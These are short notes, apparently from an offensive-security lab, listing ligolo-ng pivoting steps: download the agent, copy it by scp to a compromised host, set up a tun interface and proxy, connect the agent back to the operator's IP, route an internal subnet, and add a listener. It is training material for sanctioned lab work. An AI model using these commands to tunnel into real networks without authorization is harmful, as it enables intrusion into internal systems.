ligolo
agent download
```
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz
tar -xzvf ligolo-ng_agent_0.5.2_linux_amd64.tar.gz
```

upload agent
```
scp ./agent offsec@192.168.219.120:/home/offsec/
```

proxy start
```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

connect to proxy
```
.\agent -connect 192.168.45.167:11601 -ignore-cert
```

start session
```
session
```

add route (another terminal)
```
sudo ip route add 172.16.219.0/24 dev ligolo
```

ligolo-ng start
```
start
```


```
listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000
```
